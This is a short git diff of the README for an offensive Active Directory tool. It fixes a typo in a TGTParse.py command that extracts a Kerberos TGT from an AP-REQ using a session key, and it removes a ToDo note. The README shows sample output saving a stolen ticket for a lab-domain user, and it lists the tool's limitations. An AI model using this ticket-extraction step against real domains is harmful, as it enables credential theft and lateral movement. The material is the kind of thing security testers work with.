@@ -99,7 +99,7 @@ AES256
 You can use TGTParse.py code to extract the TGT from the AP-REQ using the session key.
 The TGTParse.py code was a refactor of the version available on Github : [https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse](https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse) by Connor McGarr (@33y0re).
 ```
-.python TGTParse.py  --sessionkey W0612fo...(snip)...43JYdqc= --apreq YIINBwYJKoZIh...(snip)...vcSAQICAysc3 --etype AES256
+python TGTParse.py  --sessionkey W0612fo...(snip)...43JYdqc= --apreq YIINBwYJKoZIh...(snip)...vcSAQICAysc3 --etype AES256
 
 [+] Identified ticket for robb.stark@NORTH.SEVENKINGDOMS.LOCAL
 [+] Successfully extracted the TGT! Saved as: robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache!
@@ -126,9 +126,6 @@ python3 tgtParse.py --apreq <BASE64_APREQ> --sessionkey <BASE64_KEY> --etype <AE
 There are a few limitations, it doesn't work if the target accounts are:
 - member of protected users;
 - account is sensitive and cannot be delegated.
-
-## ToDo
-- Code rework, the current code is a poc, not the definitive code.
 
 ## Credits
 Many thanks to these projects, all I did was put the ideas together.
